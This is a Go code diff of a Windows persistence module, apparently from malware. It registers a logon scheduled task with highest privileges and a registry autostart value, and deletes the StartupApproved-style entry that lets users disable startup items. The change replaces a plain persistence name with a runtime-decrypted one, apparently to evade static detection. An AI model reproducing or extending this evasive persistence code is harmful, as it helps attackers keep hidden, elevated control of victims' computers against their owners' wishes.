@@ -41,7 +41,7 @@ func Persist(filePath string) bool {
 
 		xml := strings.ReplaceAll(schedularXML, "%THE_CMD%", filePath)
 		xml = strings.ReplaceAll(xml, "%THE_ARG%", store.LAUNCH_KEY)
-		xml = strings.ReplaceAll(xml, "%THE_NAME%", store.PERSISTENCE_NAME)
+		xml = strings.ReplaceAll(xml, "%THE_NAME%", store.DecryptedPersistenceName)
 
 		xmlPath := filepath.Join(os.TempDir(), fmt.Sprintf("%d.xml", time.Now().UnixNano()))
 
@@ -51,7 +51,7 @@ func Persist(filePath string) bool {
 
 			err := utils.RunCommand(
 				"schtasks", "/create",
-				"/tn", store.PERSISTENCE_NAME,
+				"/tn", store.DecryptedPersistenceName,
 				"/xml", xmlPath,
 				"/f",
 			)
@@ -63,7 +63,7 @@ func Persist(filePath string) bool {
 		} else {
 			err := utils.RunCommand(
 				"schtasks", "/create",
-				"/tn", store.PERSISTENCE_NAME,
+				"/tn", store.DecryptedPersistenceName,
 				"/tr", command,
 				"/sc", "ONLOGON",
 				"/rl", "HIGHEST",
@@ -83,7 +83,7 @@ func Persist(filePath string) bool {
 		err := utils.RunCommand(
 			"reg", "delete",
 			START_ALLOWED,
-			"/v", store.PERSISTENCE_NAME,
+			"/v", store.DecryptedPersistenceName,
 			"/f",
 		)
 
@@ -95,7 +95,7 @@ func Persist(filePath string) bool {
 		err = utils.RunCommand(
 			"reg", "add",
 			AUTO_START,
-			"/v", store.PERSISTENCE_NAME,
+			"/v", store.DecryptedPersistenceName,
 			"/t", "REG_SZ",
 			"/d", command,
 			"/f",
@@ -118,7 +118,7 @@ func Unpersist() bool {
 
 		err := utils.RunCommand(
 			"schtasks", "/delete",
-			"/tn", store.PERSISTENCE_NAME,
+			"/tn", store.DecryptedPersistenceName,
 			"/f",
 		)
 
@@ -133,7 +133,7 @@ func Unpersist() bool {
 		err := utils.RunCommand(
 			"reg", "delete",
 			AUTO_START,
-			"/v", store.PERSISTENCE_NAME,
+			"/v", store.DecryptedPersistenceName,
 			"/f",
 		)
 
